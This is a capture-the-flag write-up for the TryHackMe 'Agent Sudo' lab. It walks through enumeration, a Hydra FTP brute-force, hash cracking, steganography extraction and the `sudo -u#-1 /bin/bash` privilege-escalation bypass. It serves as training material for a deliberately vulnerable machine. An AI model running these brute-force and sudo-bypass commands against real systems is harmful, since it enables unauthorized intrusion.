---
title: "Agent Sude Writeup | TryHackMe"
layout: page
---

# Agent Sudo
You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth.
[Join the room here](https://tryhackme.com/room/agentsudoctf)
## Nmap Scan
```
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```
There are three ports open FTP on port 21, SSH on port 22 and web on port 80

## Enumeration
Agents have codename which is a single alphabet, Using Burp Suite I was able to bruteforce user-agent and the user-agent was C
It redirected me to http://<MACHINE_IP>/agent_C_attention.php
There I found a little text message
```
Attention chris,

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!

From,
Agent R 
```
And we found the user `chris`

## Exploitation
Bruteforcing using hydra `hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://<MACHINE_IP>`
> username - chris

> password - XXXXXXX

Now we know the password, we can login through FTP
Using an ls command we can see all the files in the FTP server
```
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
```
Dumped all the files using `mget *`
I used `binwalk -e cutie.png` to extract all hidden files, Found a 8702.zip and it is encrypted
I am using `zip2john 8702.zip > Output.txt` to extract the hash fro ZIP file for john to crack and `john Output.txt` to crack the hash and we got the password alien

Extracted 8702.zip using `7z e 8702.zip` using the password we previously cracked, The ZIP consisted a TXT file `To_agentR.txt`
Opening the `To_agentR.txt` has the following message
```
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```
There is a little encoded string Its was Base64 encoded, It decodes to `Area51`
Using the `steghide — extract -sf cute-alien.jpg` to find hidden files in the other jpg it was asking for a passphrase and I used the previous decoded string, After extracting we got a file `message.txt`
```
Hi james,

Glad you find this message. Your login password is XXXXXXXXXXXX 

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```
Awesome! We got SSH credentials. Let us login using the credentials
> username - james

> password - XXXXXXXXXXXX

Got our first flag `user_flag.txt`
## Priveleges Escalation 

running `sudo -l` to know the priveleges of the current logged in user
```
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```
After searching about `(ALL, !root) /bin/bash` I got to know that its a vulnerability that allows root access 
```
vulnerability is relevant in a specific configuration in the Sudo security policy,
called “sudoers”, which helps ensure that privileges are limited only to specific users.
(source:whitesourcesoftware)
```
Got the root shell using `sudo -u#-1 /bin/bash` and we got our root flag in `/root/root.txt`
